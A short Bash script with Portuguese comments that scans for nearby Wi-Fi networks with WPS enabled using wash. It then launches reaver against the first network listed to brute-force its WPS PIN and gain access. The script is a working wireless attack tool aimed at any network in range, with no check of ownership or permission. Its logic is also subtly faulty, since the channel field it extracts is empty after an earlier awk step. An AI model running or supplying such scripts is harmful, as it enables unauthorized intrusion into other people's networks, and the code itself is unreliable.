#!/bin/bash

# Definir a interface de rede sem fio
interface="wlan0"

# Ativar a interface de rede sem fio
ifconfig $interface up

# Procurar por redes sem fio com WPS ativo
echo "Procurando por redes sem fio com WPS ativo..."
wash -i $interface | grep -E '[0-9A-F]{2}(:[0-9A-F]{2}){5}' > wps_networks.txt

# Selecionar a primeira rede da lista
echo "Selecionando a primeira rede com WPS ativo da lista..."
network=$(cat wps_networks.txt | head -n 1 | awk '{print $1}')

# Extrair informações da rede
echo "Extraindo informações da rede selecionada..."
bssid=$(echo $network | cut -d" " -f1)
channel=$(echo $network | cut -d" " -f3)

# Iniciar a quebra de PIN WPS
echo "Iniciando a quebra de PIN WPS da rede selecionada..."
reaver -i $interface -b $bssid -c $channel -vv
